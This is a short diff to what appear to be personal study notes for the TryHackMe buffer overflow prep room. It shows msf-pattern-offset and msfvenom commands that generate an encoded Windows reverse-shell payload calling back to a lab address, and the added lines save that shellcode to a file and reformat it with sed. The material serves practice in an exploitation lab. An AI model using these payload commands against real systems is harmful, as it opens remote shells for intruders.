@@ -70,6 +70,10 @@ msf-pattern-offset -l 3000 -q 33794332
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"`
 
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a" > shelloutput1.txt`
+
+`sed -z 's/\n//g' shelloutput1.txt | sed -z 's/"//g' - `
+
 https://tryhackme.com/room/bufferoverflowprep 
 
 https://www.youtube.com/watch?v=1X2JGF_9JGM 
